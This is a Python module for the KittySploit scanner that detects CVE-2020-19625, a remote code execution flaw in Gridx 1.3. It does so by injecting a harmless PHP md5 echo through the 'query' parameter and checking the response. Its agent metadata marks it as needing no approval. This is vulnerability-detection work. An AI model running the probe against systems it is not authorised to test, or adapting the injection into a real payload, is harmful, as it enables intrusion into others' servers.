#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gridx 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gridx 1.3 - Remote Code Execution Detection',
        'description': 'Gridx 1.3 is susceptible to remote code execution via tests/support/stores/test_grid_filter.php, which allows remote attackers to execute arbitrary code via crafted values submitted to the $query parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'gridx', 'rce', 'gridx_project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://mayoterry.com/file/cve/Remote_Code_Execution_Vulnerability_in_gridx_latest_version.pdf',
            'https://github.com/oria/gridx/issues/433',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-19625',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2020-19625',
    }

    def run(self):
        r = self.http_request(method="GET", path='/tests/support/stores/test_grid_filter.php?query=echo%20md5%28%22CVE-2020-19625%22%29%3B', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('6ca86c2c17047c14437f55c42c801c10',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="Gridx 1.3 - Remote Code Execution detected",
                path='/tests/support/stores/test_grid_filter.php?query=echo%20md5%28%22CVE-2020-19625%22%29%3B',
            )
            return True
        return False

